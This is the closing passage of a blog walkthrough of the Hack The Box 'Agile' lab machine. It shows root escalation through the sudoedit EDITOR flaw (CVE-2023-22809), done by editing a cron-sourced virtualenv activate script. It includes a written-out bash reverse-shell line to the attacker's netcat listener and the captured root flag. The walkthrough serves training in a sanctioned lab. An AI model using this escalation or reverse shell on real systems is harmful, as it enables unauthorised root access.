</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>edwards@agile:/dev/shm$ sudo --version
</span></span><span class=line><span class=cl>Sudo version 1.9.9
</span></span><span class=line><span class=cl>Sudoers policy plugin version 1.9.9
</span></span><span class=line><span class=cl>Sudoers file grammar version <span class=m>48</span>
</span></span><span class=line><span class=cl>Sudoers I/O plugin version 1.9.9
</span></span><span class=line><span class=cl>Sudoers audit plugin version 1.9.9
</span></span><span class=line><span class=cl>edwards@agile:/dev/shm$ 
</span></span></code></pre></td></tr></table></div></div><p>Our target should be vulnerable.</p><p>How does this vulnerability work? Essentially, when we run <code>sudoedit /app/config_test.json</code>, the <code>EDITOR</code> environment variable is used by the policy module to choose an editor for the file. The sudoers module constructs a new argument consisting of the selected editor, which may contain multiple arguments.</p><p>Why is this a problem? We can add <code>--</code> to our <code>EDITOR</code>, which in bash signifies the end of command options. We already know our cron job that runs <code>test_and_update.sh</code> will source <code>/app/venv/bin/activate</code>. This file is executed in the current shell context to setup our <code>PATH</code> for running python binaries (<code>pytest</code>, in this instance). Can we modify this file and add arbitrary code?:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>edwards@agile:/app/venv/bin$ ls -al activate
</span></span><span class=line><span class=cl>-rw-rw-r-- <span class=m>1</span> root dev_admin <span class=m>1976</span> Mar <span class=m>24</span> 09:30 activate
</span></span></code></pre></td></tr></table></div></div><p>We can see the <code>activate</code> script is owned by root and group dev_admin &ndash; the user who we are able to assume privileges as for modifying two particularly files. Back to setting <code>EDITOR</code> &ndash; let&rsquo;s try terminating the command options with <code>--</code> within this variable, and running sudoedit:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>EDITOR</span><span class=o>=</span><span class=s2>&#34;vim -- /app/venv/bin/activate&#34;</span> sudoedit -u dev_admin /app/config_test.json
</span></span></code></pre></td></tr></table></div></div><p>Here we&rsquo;re specifying our editor as vim, which will be used as a prefix for the file we are able to edit.. <strong>but</strong>, we&rsquo;re specifying the end of command line flags with <code>--</code>, so effectively <code>/app/venv/bin/activate</code> will be our first <em>file</em> argument. As a result, we can edit it.</p><p>Running the above opened vim with the contents of this file. I quickly ran <code>nc -lvnp 3322</code> on my own machine to establish a netcat listener on TCP port 3322. At the bottom of the file, I added the following reverse shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bash -i &gt;<span class=p>&amp;</span> /dev/tcp/10.10.14.8/3322 0&gt;<span class=p>&amp;</span><span class=m>1</span>
</span></span></code></pre></td></tr></table></div></div><p>Then, <code>:wq</code> (I think I remember how to quit vim?..). Running <code>cat /app/venv/bin/activate</code> showed my little reverse shell had been persisted to the file (sudoedit writes to a temp file first, then overwrites the original file), so things look promising.</p><p>Now we wait, and after a little patience our cron job kicks off, <code>source</code>s our modified file which establishes a reverse shell running as root:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$nc</span> -lvnp <span class=m>3322</span>
</span></span><span class=line><span class=cl>Listening on 0.0.0.0 <span class=m>3322</span>
</span></span><span class=line><span class=cl>Connection received on 10.10.11.203 <span class=m>54960</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>36640<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>root@agile:~# ls -la
</span></span><span class=line><span class=cl>ls -la
</span></span><span class=line><span class=cl>total <span class=m>76</span>
</span></span><span class=line><span class=cl>drwx------  <span class=m>8</span> root root  <span class=m>4096</span> Mar  <span class=m>8</span> 15:30 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>20</span> root root  <span class=m>4096</span> Feb <span class=m>20</span> 23:29 ..
</span></span><span class=line><span class=cl>lrwxrwxrwx  <span class=m>1</span> root root     <span class=m>9</span> Feb  <span class=m>6</span> 16:56 .bash_history -&gt; /dev/null
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root  <span class=m>3106</span> Dec  <span class=m>1</span> 19:00 .bashrc
</span></span><span class=line><span class=cl>drwx------  <span class=m>4</span> root root  <span class=m>4096</span> Feb  <span class=m>8</span> 16:29 .cache
</span></span><span class=line><span class=cl>drwx------  <span class=m>3</span> root root  <span class=m>4096</span> Feb  <span class=m>8</span> 16:29 .config
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>3</span> root root  <span class=m>4096</span> Feb  <span class=m>8</span> 16:29 .local
</span></span><span class=line><span class=cl>-rw-------  <span class=m>1</span> root root    <span class=m>53</span> Feb  <span class=m>6</span> 17:14 .my.cnf
</span></span><span class=line><span class=cl>drwx------  <span class=m>3</span> root root  <span class=m>4096</span> Feb  <span class=m>8</span> 16:29 .pki
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root   <span class=m>161</span> Dec <span class=m>13</span> 17:59 .profile
</span></span><span class=line><span class=cl>drwx------  <span class=m>2</span> root root  <span class=m>4096</span> Feb  <span class=m>8</span> 16:29 .ssh
</span></span><span class=line><span class=cl>-rw-------  <span class=m>1</span> root root <span class=m>14823</span> Mar  <span class=m>8</span> 15:30 .viminfo
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>5</span> root root  <span class=m>4096</span> Feb  <span class=m>8</span> 16:29 app
</span></span><span class=line><span class=cl>-rwxr-xr-x  <span class=m>1</span> root root    <span class=m>31</span> Jan <span class=m>25</span> 21:02 clean.sh
</span></span><span class=line><span class=cl>-rw-r-----  <span class=m>1</span> root root    <span class=m>33</span> Mar <span class=m>24</span> 05:38 root.txt
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root  <span class=m>2293</span> Feb <span class=m>28</span> 16:50 superpass.sql
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root  <span class=m>3274</span> Feb  <span class=m>6</span> 17:06 testdb.sql
</span></span><span class=line><span class=cl>root@agile:~# cat root.txt
</span></span><span class=line><span class=cl>cat root.txt
</span></span><span class=line><span class=cl>d4a76f6af6ec1bd2249a128031538b41
</span></span></code></pre></td></tr></table></div></div><p>We have the root flag! And with that, we&rsquo;re done!</p><h2 id=conclusion>Conclusion</h2><p>A super cool machine. LFI was nothing new or unexpected, but exploiting two different remote buggers - Werkzeug, which required a little detective work, and the Chrome remote debugger &ndash; were both new attack vectors I&rsquo;ve not encountered until now. The <code>sudoedit</code> vulnerability where we set the <code>EDITOR</code> was also new to me, and it&rsquo;s awesome when machines include quite new CVEs like this in a real worldish setting. Super fun machine overall.</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-08-06&nbsp;<a class=git-hash href=https://github.com/m-dwyer/emdwyer.github.io/commit/bd70da490584dce1f5142de590749fdaddb18fcc target=_blank title="commit by m-dwyer(13535330+m-dwyer@users.noreply.github.com) bd70da490584dce1f5142de590749fdaddb18fcc: Add foothold section header to agile walkthrough">
<i class="fas fa-hashtag fa-fw" aria-hidden=true></i>bd70da4</a></span></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/2023-08-06-agile-htb/index.md target=_blank>Read Markdown</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Linkedin" data-sharer=linkedin data-url=https://emdwyer.github.io/2023-08-06-agile-htb/><i class="fab fa-linkedin fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=https://emdwyer.github.io/2023-08-06-agile-htb/ data-title="Agile HTB Walkthrough"><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=https://emdwyer.github.io/2023-08-06-agile-htb/ data-title="Agile HTB Walkthrough"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=https://emdwyer.github.io/2023-08-06-agile-htb/ data-title="Agile HTB Walkthrough"><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/htb/>htb</a>,&nbsp;<a href=/tags/security/>security</a>,&nbsp;<a href=/tags/penetration-testing/>penetration testing</a>,&nbsp;<a href=/tags/werkzeug/>werkzeug</a>,&nbsp;<a href=/tags/sudoedit/>sudoedit</a>,&nbsp;<a href=/tags/chrome/>chrome</a>,&nbsp;<a href=/tags/cve-2023-22809/>CVE-2023-22809</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/2023-06-03-bagel-htb/ class=prev rel=prev title="Bagel HTB Walkthrough"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>Bagel HTB Walkthrough</a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>emdwyer</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/valine@1.5.0/dist/Valine.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{valine:{appId:"QGzwQXOqs5JOhN4RGPOkR2mR-MdYXbMMI",appKey:"WBmoGyJtbqUswvfLh6L8iEBr",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@14.0.0/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"en",pageSize:10,placeholder:"Your comment ...",recordIP:!0,serverURLs:"https://leancloud.hugoloveit.com",visitor:!0}},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>